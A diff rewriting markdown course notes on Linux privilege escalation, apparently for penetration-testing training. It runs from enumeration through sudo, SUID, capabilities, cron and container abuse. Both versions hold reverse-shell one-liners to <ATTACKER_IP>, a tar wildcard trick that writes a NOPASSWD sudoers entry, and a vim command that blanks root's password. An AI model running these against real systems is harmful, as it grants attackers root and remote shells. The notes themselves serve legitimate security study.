@@ -2,320 +2,405 @@
 
 ## Introduction to Linux Privilege Escalation
 
-Root on a Linux host → capture traffic, read sensitive files, and pivot further. If the host is domain-joined, root means the NTLM hash and a path into attacking Active Directory.
+Root gives full admin access on Linux. Escalating lets you capture traffic, read sensitive files, and if the host is domain joined, grab the NTLM hash to attack AD.
 
-First shell on a host — the checklist:
+### Enumeration
 
-- **OS version** — distribution + version → available tools, public exploits. Check whether the release is still maintained (e.g. Ubuntu Focal = supported → likely patched kernel; still check).
-- **Kernel version** — public kernel exploits may exist. Kernel exploits can crash the box; understand the exploit before running it against production.
-- **Running services**, especially as root — misconfigured/vulnerable root services are an easy win (Nagios, Exim, Samba, ProFTPd; e.g. CVE-2016-9566, LPE in Nagios Core < 4.2.4). `ps aux | grep root`
-- **Installed packages** — out-of-date/vulnerable versions (e.g. Screen 4.05.00, privesc).
-- **Logged-in users** — lateral movement hints: `ps au` (terminal-attached processes).
-- **Home directories** — other users' dirs readable? SSH keys, scripts, configs with credentials: `ls /home`, `ls -la /home/<user>/`. Check `.bash_history` — passwords as arguments, git usage, cron setup. Found SSH keys → try them on the host (stable session) and on other systems; cross-reference the ARP cache (`arp -a`) against usable keys. `ls -l ~/.ssh`
-- **Sudo rights** — `sudo -l`. `NOPASSWD` entries show without a password; a user with full sudo is one `sudo su` from root. Not every root-runnable command escalates, though.
-- **Config files** — `.conf`/`.config` files → usernames, passwords, secrets.
-- **Readable `/etc/shadow`** → all password hashes → offline crack.
-- **Hashes in `/etc/passwd`** — file is world-readable; uncommon but seen on embedded devices/routers → offline crack.
-- **Cron jobs** — maintenance/backup tasks; combined with relative paths or weak permissions → escalation.
-- **Unmounted filesystems / extra drives** — `lsblk`; mountable drives may hold backups, passwords.
-- **setuid/setgid binaries** — run as root/group; many have abusable features.
-- **Writable directories** — where to drop tools; a writable dir receiving cron output reveals job frequency and possible script overwrite.
-- **Writable files** — world-writable scripts/configs run by root → append a command.
+Check OS/distro and kernel version for public exploits, services running as root for an easy misconfigured/vulnerable win (e.g. CVE-2016-9566, Nagios Core < 4.2.4), installed package versions (e.g. Screen 4.05.00), logged in users, and user home directories for SSH keys, configs and creds.
 
 ```bash
-# world-writable directories / files
-find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
-find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+sudo -l # check current user's sudo rights, NOPASSWD entries show without a password
 ```
+
+```bash
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # world-writable directories
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # world-writable files
+```
+
+Check home directories and `~/.ssh` for private keys. Cross-reference the ARP cache against usable keys for lateral movement. Password hashes directly in `/etc/passwd` (uncommon, seen on embedded devices/routers) or a readable shadow file can be cracked offline.
 
 ## Environment Enumeration
 
-Helper scripts exist (LinPEAS/LinEnum), but know what to look for manually. Orientation first — `whoami`, `id` (groups), `hostname`, `ifconfig` or `ip a` (subnet, extra NICs → other subnets), `sudo -l`.
+Helper scripts like LinPEAS and LinEnum speed up enumeration, but manual checks matter for understanding what to look for and for when a script isn't available.
+
+### Gaining Situational Awareness
+
+- `whoami` - current user
+- `id` - groups the user belongs to
+- `hostname` - server name, may hint at naming convention
+- `ifconfig` / `ip a` - current subnet, other NICs/subnets reachable
+- `sudo -l` - sudo rights, easy win if NOPASSWD
+
+Check `/etc/os-release` (or `/etc/lsb-release`) for distro and version, and whether it's still within its support window. Check `/etc/shells` for valid login shells, note if `tmux`/`screen` are present.
 
 ```bash
-cat /etc/os-release           # distro + version
-uname -a                      # kernel; alternative: cat /proc/version
-echo $PATH                    # misconfigured PATH = privesc (see Path Abuse)
-env                           # may leak passwords
-cat /etc/shells               # login shells; note tmux/screen availability
-lsblk                         # block devices, unmounted partitions
-lpstat                        # printers — queued jobs may hold sensitive data
-route                         # or netstat -rn — reachable networks
-cat /etc/resolv.conf          # internal DNS → AD enumeration starting point
-arp -a
+echo $PATH # note for later PATH abuse
+env # check for sensitive values like passwords
+uname -a # kernel version, search for a public exploit
 ```
 
-Check `/etc/fstab` for mounts and grep it for `password`, `username`, `credential` — creds for mounted drives live there.
+Also check for defenses in place:
 
-Defenses to look for (their presence changes what's worth trying): Exec Shield, iptables, AppArmor, SELinux, Fail2ban, Snort, ufw. Config enumeration of these usually needs privileges, but knowing they exist avoids wasted effort.
-
-Users and groups:
+- Exec Shield
+- iptables
+- AppArmor
+- SELinux
+- Fail2ban
+- Snort
+- Uncomplicated Firewall (ufw)
 
 ```bash
-cat /etc/passwd                     # username:password:UID:GID:info:home:shell
-cat /etc/passwd | cut -f1 -d:       # usernames
-grep "sh$" /etc/passwd              # users with login shells; old bash (e.g. 4.1) → shellshock
-cat /etc/group
-getent group sudo                   # members of any interesting group
-ls /home
+lsblk # block devices, mount unmounted ones for backups/sensitive files
+route # or netstat -rn, routing table for reachable subnets
+arp -a # hosts the target has talked to
 ```
 
-Hash algorithm by prefix: `$1$` salted MD5, `$5$` SHA-256, `$6$` SHA-512, `$2a$` BCrypt, `$7$` Scrypt, `$argon2i$` Argon2.
+`lpstat` lists printers and queued print jobs, may hold sensitive data.
 
-Enumerate each home directory for readable `.bash_history`, config files, and SSH keys — persistence, privesc, or pivoting material. Any password found → try it against all users; reuse is common.
+If the host uses internal DNS, `/etc/resolv.conf` can be a starting point to query the AD environment.
 
-Filesystems:
+### Existing Users
+
+`/etc/passwd` fields: username, password, UID, GID, GECOS, home dir, shell.
+
+`$1$` MD5 | `$5$` SHA-256 | `$6$` SHA-512 | `$2a$` BCrypt | `$7$` Scrypt | `$argon2i$` Argon2
 
 ```bash
-df -h                                        # mounted filesystems
-cat /etc/fstab | grep -v "#" | column -t     # unmounted filesystems
-find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null    # hidden files
-find / -type d -name ".*" -ls 2>/dev/null                  # hidden directories
-ls -l /tmp /var/tmp /dev/shm
+grep "sh$" /etc/passwd # users with login shells, check old bash (<4.1) for shellshock
 ```
 
-`/tmp` — auto-deleted after ~10 days and wiped on reboot. `/var/tmp` — retained up to 30 days and survives reboots, so programs keep data there. All three are readable by everyone: check for temp logs, script output, leftovers.
+### Existing Groups
 
-Run linPEAS in a real assessment on top of the manual work — it often surfaces nuanced issues manual enumeration misses.
+`/etc/group` lists groups and their members.
+
+```bash
+getent group <GROUP> # list members of a group, e.g. sudo
+```
+
+### Mounted File Systems
+
+```bash
+df -h # mounted file systems, look for unusual mounts
+```
+
+### Unmounted File Systems
+
+Grep `/etc/fstab` for creds (password, username, credential).
+
+```bash
+cat /etc/fstab | grep -v "#" | column -t # configured file systems, cleanly formatted
+```
+
+### All Hidden Files
+
+```bash
+find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
+```
+
+### All Hidden Directories
+
+```bash
+find / -type d -name ".*" -ls 2>/dev/null
+```
+
+### Temporary Files
+
+`/tmp` clears on reboot and after 10 days. `/var/tmp` persists up to 30 days, used by programs needing data to survive a reboot.
 
 ## Linux Services & Internals Enumeration
 
-Deeper pass informing the later attacks: installed/running services, sockets, users/admins/groups, logged-in users and last logins, password policies, domain membership, history/log/backup files, recently modified files (patterns → hijackable cron), IP info, `/etc/hosts`, network connections, installed tools (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc), bash history, cron jobs.
+Covers installed/running services, sockets, users/groups, password policy, AD join status, history/log/backup files, recently modified files (cron hijack clues), network info, and installed tools (netcat, python, nmap, gcc, etc.).
+
+### Internals
+
+#### Network Interfaces
+
+Additional NICs can mean the host bridges into another subnet, useful for pivoting.
+
+#### Hosts
+
+Check `/etc/hosts` for internal hostnames that hint at other systems.
+
+#### User's Last Login
 
 ```bash
-ip a
-cat /etc/hosts
-lastlog                      # who logs in, how often
-w                            # current users; also who / finger
-history
-find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
-ls -la /etc/cron.daily/
-find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"   # process cmdlines — scripts/binary paths per user
+lastlog # per-user last login time, shows usage patterns
 ```
 
-Packages and binaries:
+#### Logged In Users
+
+```bash
+w # or who/finger, shows who else is on the system now
+```
+
+#### Command History
+
+Review for passwords passed as args, git use, and cron setup.
+
+#### Finding History Files
+
+```bash
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+```
+
+#### Proc
+
+procfs exposes process/kernel info, dynamically generated. Used to view process state, kernel params, memory, and devices.
+
+```bash
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" # full command lines, may leak creds passed as args
+```
+
+### Services
+
+#### Installed Packages
 
 ```bash
 apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
-sudo -V                      # sudo version — check for legacy exploits
-ls -l /bin /usr/bin/ /usr/sbin/
 ```
 
-Compare installed packages against GTFOBins to find candidates to investigate:
+#### Sudo Version
+
+```bash
+sudo -V # check for known sudo CVEs (e.g. CVE-2021-3156)
+```
+
+#### GTFObins
+
+GTFOBins lists binaries exploitable to bypass restrictions, escalate privileges, spawn shells, or transfer files.
 
 ```bash
 for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
 ```
 
-`strace` traces system calls and signal processing — follow a program's flow to spot requests carrying passwords/tokens:
+GTFOBins: https://gtfobins.org
+
+#### Trace System Calls
 
 ```bash
-strace ping -c1 <TARGET_IP>
+strace <COMMAND> # trace syscalls/signals, can reveal creds or tokens sent to remote hosts
 ```
 
-Config files and scripts are usually world-readable; even without write perms they reveal keys, internal paths, and processes worth abusing:
+#### Configuration Files
 
 ```bash
 find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
-find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
-ps aux | grep root           # which scripts/binarys root is running
 ```
+
+#### Scripts
+
+```bash
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+```
+
+#### Running Services by User
+
+A script run by root with loose write permissions can be edited and run without root access.
 
 ## Credential Hunting
 
-Note every credential found — config files (`.conf`, `.config`, `.xml`), shell scripts, bash history, backup (`.bak`) files, database files, text files. Useful for escalating to other users, root, or other systems.
-
-`/var` typically holds the web root — MySQL connection strings, WordPress config:
+Credentials can turn up in configs (`.conf`, `.config`, `.xml`), shell scripts, bash history, `.bak` backups, databases, or text files. Useful for escalating to other users/root or accessing other systems.
 
 ```bash
-grep 'DB_USER\|DB_PASSWORD' wp-config.php
-```
-
-Spool/mail directories, if accessible, are also worth checking. Broad config sweep:
-
-```bash
+grep 'DB_USER\|DB_PASSWORD' wp-config.php # example: WordPress DB creds
 find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
 ```
 
-SSH keys: search for accessible private keys — a key for a more privileged user gets you back in with more rights; keys for other hosts get lateral movement. Always check `known_hosts` (hosts the user connected to) for targets:
+Check the web root (typically under `/var`) and spool/mail directories for stored creds.
 
-```bash
-ls ~/.ssh
-```
+### SSH Keys
+
+Check `known_hosts` for other targets a key's owner has connected to, useful for lateral movement.
 
 ## Path Abuse
 
-PATH holds the directories searched for executables. A script dropped in a PATH directory runs from anywhere. If we can modify a user's PATH, we can shadow a common binary like `ls` with a malicious script:
+PATH lists the directories searched for an executable by name instead of needing its full path. Check it with `echo $PATH` or `env | grep PATH`.
+
+A script or program placed in a directory on PATH becomes runnable from anywhere on the system.
+
+Adding `.` to PATH adds the current working directory to the search list, so a malicious file named like a common binary (e.g. `ls`) runs instead of the real one when just the name is typed.
 
 ```bash
-echo $PATH
 PATH=.:${PATH}
 export PATH
-
-touch ls
-echo 'echo "PATH ABUSE!!"' > ls
-chmod +x ls
-
-ls
-PATH ABUSE!!
 ```
-
-This is why sudoers entries without absolute paths are exploitable (see Sudo Rights Abuse).
 
 ## Wildcard Abuse
 
-Wildcards (`*` any chars, `?` single char, `[]` char set, `~` home, `-` range inside brackets) are interpreted by the shell before other actions — so a wildcard in a cron job can turn *file names we create* into command-line options.
-
-Classic example: `tar` supports `--checkpoint[=N]` and `--checkpoint-action=ACTION`, including `EXEC`. Given a cron job backing up a user directory every minute:
-
-```text
-*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
-```
-
-The `*` expands to include files we create named as tar options:
+Wildcards (`*`, `?`, `[ ]`, `~`, `-`) are interpreted by the shell before other actions. `tar`'s `--checkpoint-action` can run an arbitrary command when a wildcard passes crafted filenames as arguments.
 
 ```bash
-echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+echo 'echo "<USERNAME> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
 echo "" > "--checkpoint-action=exec=sh root.sh"
 echo "" > --checkpoint=1
 ```
 
-When the cron job runs, tar receives `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` as arguments and executes `root.sh` as root. Next `sudo -l` shows `(root) NOPASSWD: ALL` → root.
+Exploits a cron job that runs `tar` with a wildcard (e.g. `tar -zcf backup.tar.gz *`) in a writable directory. On the next run the crafted filenames get parsed as `tar` options, executing `root.sh` as root.
+
+```bash
+sudo -l # confirm the new NOPASSWD entry after the cron job runs
+```
 
 ## Escaping Restricted Shells
 
-Restricted shells limit what commands a user can run and where: `rbash` (no cd, no env changes, no commands outside PATH), `rksh` (no functions/env modification), `rzsh` (no scripts, aliases, env changes). Common in enterprises to cage external partners, contractors, etc.
+A restricted shell limits which commands or directories a user can access. Common types: `rbash`, `rksh`, `rzsh`.
 
-Escape avenues:
+### RBASH
 
-- **Command injection** — inject into arguments of an allowed command: `ls -l `pwd`` runs `pwd` even if `pwd` itself is restricted.
-- **Command substitution** — backtick or `$(...)` syntax if the shell allows it.
-- **Command chaining** — `;` or `|` between an allowed and a restricted command.
-- **Environment variables** — modify a variable the shell uses to pick the execution directory.
-- **Shell functions** — define a function that runs a non-restricted command, if function definitions are permitted.
+Restricted Bourne shell. Blocks changing directories, modifying env vars, and running commands outside allowed directories.
+
+### RKSH
+
+Restricted Korn shell. Blocks running commands in other directories, defining/modifying shell functions, and modifying the shell environment.
+
+### RZSH
+
+Restricted Z shell. Blocks running scripts, defining aliases, and modifying the shell environment.
+
+### Command injection
+
+Inject a command into an argument the shell passes to an allowed builtin.
+
+```bash
+ls -l `pwd`
+```
+
+### Command Substitution
+
+Run an unrestricted command inside backtick substitution syntax, if backticks aren't filtered.
+
+### Command Chaining
+
+Separate commands with a shell metacharacter (`;`, `|`) if the shell allows multiple commands per line.
+
+### Environment Variables
+
+Modify or create an environment variable the shell uses to decide where/what to execute, to point it somewhere unrestricted.
+
+### Shell Functions
+
+Define a shell function that runs an unrestricted command, if the shell allows defining and calling functions.
 
 ## Special Permissions
 
-setuid (the `s` in the owner bits) runs a binary as its owner — usually root. Enumerate:
+SETUID lets a binary run with the file owner's privileges (commonly root), shown as `s` in permissions. SETGID does the same for the group that created the binary.
 
 ```bash
-find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null # SETUID binaries owned by root
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null # SETGID binaries owned by root
 ```
 
-setgid does the same for the group:
+### GTFOBins
+
+Curated list of binaries/scripts usable to bypass restrictions, escalate privileges, spawn shells, or transfer files.
 
 ```bash
-find / -uid 0 -perm -6000 -type f 2>/dev/null
-find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh # example: apt-get breakout via Pre-Invoke
 ```
 
-Attack angle: reverse engineer setuid programs for vulns, or abuse their built-in command-execution features.
-
-**GTFOBins** — curated list of binaries usable to escape restricted shells, escalate privileges, spawn shells, transfer files. Worth memorizing as many as possible. Example with apt:
-
-```bash
-sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-```
+GTFOBins: https://gtfobins.org
 
 ## Sudo Rights Abuse
 
-`sudo -l` first — always. `NOPASSWD` entries are visible without a password. Loose sudoers rules are the win: over-broad commands, missing absolute paths, unintended options.
-
-Example — sudoers grants `(root) NOPASSWD: /usr/sbin/tcpdump`. tcpdump's `-z postrotate-command` runs a command on each savefile rotation (used with `-C`/`-G`). Payload file `/tmp/.test`:
+Sudo lets an account run specific commands as root (or another user) without switching users. Rights are set in `/etc/sudoers`. NOPASSWD entries show without needing a password.
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f
+sudo -l
 ```
+
+### tcpdump postrotate-command
+
+`tcpdump -z` runs a `postrotate-command` after each savefile rotation (used with `-C`/`-G`), usable to run an arbitrary script as root.
 
 ```bash
-sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+sudo /usr/sbin/tcpdump -ln -i <INTERFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 ```
 
-Root shell on the listener almost instantly. AppArmor on recent distributions predefines postrotate commands and blocks this.
+Payload (`/tmp/.test`):
 
-What a bad sudoers entry looks like (from the module's hardening notes): relative path instead of absolute (`cat` not `/bin/cat`) → PATH abuse; sudo granted beyond least privilege.
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
+```
+
+AppArmor on newer distros predefines postrotate-command use, blocking this.
+
+Gotcha: sudoers entries missing the absolute path to a binary (e.g. `cat` instead of `/bin/cat`) can be abused via PATH abuse.
 
 ## Privileged Groups
 
-Check `id` for these group memberships.
+Certain group memberships (`lxd`, `docker`, `disk`, `adm`) grant privileges usable to reach root or read sensitive data.
 
 ### LXC / LXD
 
-LXD group membership → create a privileged container and read the host filesystem. Unpack an Alpine image, init LXD (accept defaults), import, then:
+Ubuntu's container manager (similar to Docker). All users get added to the `lxd` group by default. Needs `lxd`/`lxc` group membership (check with `id`).
 
 ```bash
+unzip alpine.zip
+cd "64-bit Alpine/"
+lxd init # accept defaults for each prompt
 lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
-lxc init alpine r00t -c security.privileged=true    # no UID mapping → container root = host root
+lxc init alpine r00t -c security.privileged=true # no UID mapping, root in container = root on host
 lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
 lxc start r00t
 lxc exec r00t /bin/sh
 ```
 
-Host root filesystem at `/mnt/root` — read `/etc/shadow`, grab SSH keys, etc.
+Mount is accessible at `/mnt/root` inside the container, giving root-level read/write of the host filesystem (e.g. `/etc/shadow`, SSH keys).
 
 ### Docker
 
-docker group ≈ root without a password. Spawn a container with the host filesystem mounted:
+Docker group membership is effectively root-level filesystem access without a password. Members can spawn containers mounting host directories.
 
 ```bash
-docker run -v /root:/mnt -it ubuntu
+docker run -v /root:/mnt -it ubuntu # mounts host /root at /mnt in the container
 ```
-
-Browse `/mnt`, retrieve or add root SSH keys; same works for `/etc` (read `/etc/shadow`, add a user).
 
 ### Disk
 
-disk group → full access to devices in `/dev` (e.g. `/dev/sda1`). Use `debugfs` for root-level access to the entire filesystem — SSH keys, credentials, user creation.
+`disk` group members have full access to devices in `/dev` (e.g. `/dev/sda1`). Can use `debugfs` to access the entire filesystem with root-level privileges.
 
 ### ADM
 
-adm group → read all logs in `/var/log`. No direct root, but sensitive data, user actions, and cron job enumeration.
+`adm` group members can read all logs in `/var/log`. Not direct root access, but can reveal sensitive data or cron job activity.
 
 ## Capabilities
 
-Fine-grained privileges on binaries. Set with setcap:
+Linux capabilities grant processes specific privileges (finer-grained than the traditional user/group model), but can be exploited if a process is poorly sandboxed or over-privileged.
 
 ```bash
-sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic # example: grant a capability to a binary
 ```
 
-setcap values: `=` clears, `+ep` effective + permitted, `+ei` effective + inheritable (children inherit), `+p` permitted only.
+`cap_sys_admin` broad admin actions (modify system files/settings) | `cap_sys_chroot` change root dir | `cap_sys_ptrace` attach/debug other processes | `cap_sys_nice` raise/lower process priority | `cap_sys_time` modify system clock | `cap_sys_resource` modify resource limits | `cap_sys_module` load/unload kernel modules | `cap_net_bind_service` bind to network ports
 
-Privesc-relevant capabilities:
+`=` clears the capability | `+ep` effective+permitted | `+ei` effective+inheritable (children inherit) | `+p` permitted only (no inherit)
 
-- `cap_setuid` — set effective UID → become root
-- `cap_setgid` — set effective GID → root group
-- `cap_sys_admin` — broad admin actions: system files, settings, mount/umount
-- `cap_dac_override` — bypass file read/write/execute permission checks
+Capabilities usable to escalate to root: `cap_setuid` set effective UID (incl. root) | `cap_setgid` set effective GID | `cap_sys_admin` broad admin actions, mount/unmount | `cap_dac_override` bypass file read/write/execute permission checks
 
-Others worth recognizing: `cap_sys_ptrace` (debug other processes), `cap_sys_module` (load kernel modules), `cap_net_bind_service` (privileged ports).
-
-Enumerate:
+### Enumerating Capabilities
 
 ```bash
 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 ```
 
-Example — `cap_dac_override` on vim:
+### Exploitation
+
+`cap_dac_override` on a binary lets it bypass file permission checks.
 
 ```bash
 getcap /usr/bin/vim.basic
-/usr/bin/vim.basic cap_dac_override=eip
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd # strip root's password field, then su with no password
 ```
-
-vim can now edit any file regardless of permissions — rewrite `/etc/passwd` to drop root's password hash:
-
-```bash
-/usr/bin/vim.basic /etc/passwd
-# or non-interactive:
-echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
-```
-
-`root::0:0:...` → `su` logs in as root with no password.
 
 ## Vulnerable Services
 
-**Screen 4.05.00** — missing permissions check when opening a log file: truncate any file or create root-owned files anywhere → root. Check with `screen -v`, run with `./screen_exploit.sh`:
+Screen 4.5.0 has a privilege escalation vulnerability due to missing permission checks when opening a log file, letting an attacker truncate any file or create a root-owned file anywhere.
+
+```bash
+screen -v # check screen version
+```
+
+Full PoC (`screen_exploit_poc.sh`):
 
 ```bash
 #!/bin/bash
@@ -365,98 +450,80 @@ screen -ls # screen itself is setuid, so...
 
 ## Cron Job Abuse
 
-Crontab entry = minutes, hours, days, months, weeks, command (e.g. `0 */12 * * * /home/admin/backup.sh` runs every 12 hours). User crontabs land in `/var/spool/cron`; app-specific files in `/etc/cron.d` — sometimes misconfigured so non-root users can edit them.
-
-Root crontab isn't readable, but a world-writable script that runs as root is just as good — you may even infer the schedule from output artifacts (a `.tar.gz` appearing every 12 hours). Append a command; it executes on the next run.
-
-Workflow from the module: the writable-file sweep (Introduction) flags `/dmz-backups/backup.sh`. Directory listing shows tarballs created every 3 minutes — the sysadmin likely meant `0 */3 * * *` but wrote `*/3 * * * *`. The script is world-writable and runs as root.
-
-Confirm with pspy (watches running processes, cron jobs, and filesystem events via procfs — no root needed):
+Cron entries: minute, hour, day, month, weekday, command. Root's crontab is normally root-only, but a world-writable script it runs, or a misconfigured /etc/cron.d entry, can still be abused.
 
 ```bash
-./pspy64 -pf -i 1000
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # look for writable files, incl. cron-run scripts
 ```
 
-Output confirms `/bin/bash /dmz-backups/backup.sh` as UID=0, tarballing `/var/www/html`. Original script:
+A world-writable script run by a cron job can have a command appended to its end (e.g. a reverse shell) to run next execution. Confirm timing/behavior with `pspy` (no root needed, scans procfs).
 
 ```bash
-#!/bin/bash
-SRCDIR="/var/www/html"
-DESTDIR="/dmz-backups/"
-FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
-tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+./pspy64 -pf -i 1000 # -pf print commands+fs events, -i 1000 scan every 1000ms
 ```
 
-Append a reverse shell to the end (keep the original functionality intact, always back the script up first):
+Append to the vulnerable script, keeping its original function intact:
 
 ```bash
-bash -i >& /dev/tcp/<ATTACKER_IP> 443 0>&1
+bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
 ```
-
-`nc -lnvp 443` → root shell within one cycle. Append to the end so the script still runs properly before the callback.
-
 ## Containers
 
-LXC = OS-level virtualization; LXD is the daemon managing full system containers. Membership in the `lxd` (or `lxc`) group is the prerequisite — check with `id`.
+Containers isolate processes at the OS level (shared kernel); VMs virtualize hardware. Isolates privileged processes (e.g. web apps/APIs) from the host.
 
-Attack path: import an existing template (admins often keep passwordless templates around) and mount the host root:
+### Linux Containers (LXC)
+
+OS-level virtualization running multiple isolated Linux systems that share one host kernel.
+
+### Linux Daemon (LXD)
+
+Contains a full OS (system container), unlike LXC's app containers. Needs `lxd`/`lxc` group membership. Uses the same privileged-container technique as the Privileged Groups section; if a container template already exists on the target, import and use it directly:
 
 ```bash
-lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc image import <TEMPLATE>.tar.xz --alias <ALIAS>
 lxc image list
-lxc init ubuntutemp privesc -c security.privileged=true
-lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
-lxc start privesc
-lxc exec privesc /bin/bash
 ```
 
-`security.privileged=true` disables UID mapping — container root is host root. Host filesystem is now readable at `/mnt/root`.
+Then `lxc init <ALIAS> <NAME> -c security.privileged=true`, mount `/` into the container, start it, and exec in as before.
 
 ## Docker
 
-### Docker Shared Directories
+Client-server model: Docker client issues commands, Docker daemon executes them and manages containers, images, networking and volumes.
 
-Volume mounts bridge the host filesystem into the container. Enumerating a container, look for non-standard directories like `/hostsystem`:
+### Docker Privilege Escalation
+
+#### Shared Directories
+
+Containers may have non-standard host directories bind-mounted in. Check for an SSH key under a mounted host path and use it to log back in as that user.
 
 ```bash
-cd /hostsystem/home/cry0l1t3
-ls -l
-cat .ssh/id_rsa
+ssh <USERNAME>@<TARGET_IP> -i <KEY_FILE>
 ```
 
-Copy the key out and SSH into the host as that user:
+#### Docker Sockets
+
+A Docker socket (often `/var/run/docker.sock`, sometimes exposed elsewhere) lets a client talk to the daemon.
 
 ```bash
-ssh cry0l1t3@<TARGET_IP> -i cry0l1t3.priv
+wget http://<ATTACKER_IP>/docker -O docker # get docker binary if not installed
+chmod +x docker
+./docker -H unix://<SOCKET_PATH> ps
+./docker -H unix://<SOCKET_PATH> run --rm -d --privileged -v /:/hostsystem <IMAGE> # mount host / into new container
+./docker -H unix://<SOCKET_PATH> exec -it <CONTAINER_ID> /bin/bash
 ```
 
-### Docker Sockets
+#### Docker Group
 
-A `docker.sock` inside the container lets the container's docker client talk to the host daemon. If the docker binary isn't installed in the container, serve a static binary from the attack host (`wget https://<parrot-os>:443/docker -O docker`, `chmod +x docker`) and use it against the socket:
-
-```bash
-/tmp/docker -H unix:///app/docker.sock ps
-```
-
-Then create a privileged container mapping the host root into it:
+Membership in `docker` group gives root-equivalent host access without a password (also applies if docker has SUID set or the user is a sudoer for docker).
 
 ```bash
-/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
-/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
-cat /hostsystem/root/.ssh/id_rsa
-```
-
-### Docker Group
-
-Membership in `docker` (or SUID on the docker binary, or sudoers rights to docker) → daemon control. Check available images:
-
-```bash
+id # confirm docker group
 docker image ls
 ```
 
-### Docker Socket (writable)
+#### Writable Docker Socket
 
-If `/var/run/docker.sock` is writable outside the docker group, mount the host root and chroot into it:
+If `/var/run/docker.sock` is writable by a user outside root/docker group, it can still be abused.
 
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
@@ -464,48 +531,41 @@ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt 
 
 ## Kubernetes
 
-Control plane TCP ports to remember: etcd 2379/2380, API server 6443, Scheduler 10251, Controller Manager 10252, Kubelet API 10250, read-only Kubelet API 10255.
+Container orchestration platform. Control Plane manages the cluster; Worker Nodes (Minions) run pods via kubelet. A pod holds one or more containers.
 
-The Kubelet allows anonymous access by default — requests without a valid client certificate are treated as unauthenticated but still answered.
+`etcd` 2379,2380 | `API server` 6443 | `Scheduler` 10251 | `Controller Manager` 10252 | `Kubelet API` 10250 | `Read-Only Kubelet API` 10255
 
-API server first — anonymous root-path access gets denied:
+Kubelet allows anonymous access by default; unauthenticated requests are treated as `system:anonymous`.
 
 ```bash
-curl https://<TARGET_IP>:6443 -k
-# 403: User "system:anonymous" cannot get path "/"
+curl https://<TARGET_IP>:6443 -k # API server
+curl https://<TARGET_IP>:10250/pods -k | jq . # kubelet API, list pods (may leak config/secrets)
 ```
 
-Kubelet API (10250) leaks pod data — names, namespaces, images, last-applied configurations (which can contain passwords, secrets, API tokens):
+### kubeletctl
+
+Interacts with the kubelet API to list and exec against pods.
 
 ```bash
-curl https://<TARGET_IP>:10250/pods -k | jq .
+kubeletctl -i --server <TARGET_IP> pods # list pods
+kubeletctl -i --server <TARGET_IP> scan rce # find pods vulnerable to RCE
+kubeletctl -i --server <TARGET_IP> exec "<CMD>" -p <POD> -c <CONTAINER> # run a command in a pod/container
 ```
 
-kubeletctl wraps the same interaction:
+### Privilege Escalation
+
+Extract the pod's service account token and CA cert to authenticate as it against the API server.
 
 ```bash
-kubeletctl -i --server <TARGET_IP> pods          # list pods
-kubeletctl -i --server <TARGET_IP> scan rce      # which pods allow command execution
-kubeletctl -i --server <TARGET_IP> exec "id" -p nginx -c nginx
-```
-
-If exec returns `uid=0` — root inside the container. Escalate further by pulling the service account token and cert from a pod:
-
-```bash
